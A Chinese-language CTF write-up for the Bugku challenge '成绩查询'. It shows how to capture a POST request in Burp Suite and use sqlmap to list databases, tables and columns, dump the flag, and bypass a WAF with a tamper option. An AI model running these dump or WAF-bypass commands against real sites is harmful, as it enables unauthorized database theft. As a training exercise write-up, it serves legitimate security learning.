# Bugku CTF 成绩查询 WriteUp

## 题目信息

- 题目：成绩查询

- 来源：Bugku CTF（山科大CTF）

- 类型：Web（SQL注入，POST请求）

- 分值：25

---

## 漏洞分析

进入题目场景后，存在一个**成绩查询表单**，用户输入内容后以POST方式提交至后端。后端未对输入内容进行严格过滤，导致存在POST型SQL注入漏洞，可通过sqlmap工具自动化利用。

---

## 工具准备

- **sqlmap**：自动化SQL注入检测与利用工具

- **Burp Suite**：抓包工具，用于获取POST请求原始数据

---

## 操作步骤

### 1. 抓包获取POST请求

1. 打开Burp Suite，设置代理，将浏览器代理指向Burp。

2. 访问题目场景，在查询框中输入任意内容（如`test`）并提交。

3. 在Burp的`Proxy -> HTTP history`中找到对应的POST请求，右键选择**Save item**，保存为`request.txt`文件。

### 2. 使用sqlmap检测注入点

#### 方法1：加载请求文件（推荐）

```Bash

sqlmap -r request.txt
```

sqlmap会自动分析请求包，检测注入点类型。

#### 方法2：直接指定POST数据

若已知POST参数（如`name=test`），可直接使用`--data`参数：

```Bash

sqlmap -u "http://xxx" --data "name=test"
```

### 3. 爆数据库名

```Bash

sqlmap -r request.txt --dbs
```

执行后会列出所有数据库，找到目标数据库（如`skctf`或题目相关库名）。

### 4. 爆表名

```Bash

sqlmap -r request.txt -D 目标数据库名 --tables
```

从表列表中找到可能包含flag的表（如`flag`、`score`等）。

### 5. 爆字段名

```Bash

sqlmap -r request.txt -D 目标数据库名 -T 目标表名 --columns
```

找到存储flag的字段（如`flag`）。

### 6. 爆flag数据

```Bash

sqlmap -r request.txt -D 目标数据库名 -T 目标表名 -C flag --dump
```

执行后即可获取到flag内容。

---

## 补充技巧

- 若想让sqlmap自动识别表单，可使用`--forms`参数：

    ```Bash
    
    sqlmap -u "http://xxx" --forms
    ```

- 若注入过程中遇到WAF，可添加`--tamper="space2comment"`等参数绕过。
> （注：文档部分内容可能由 AI 生成）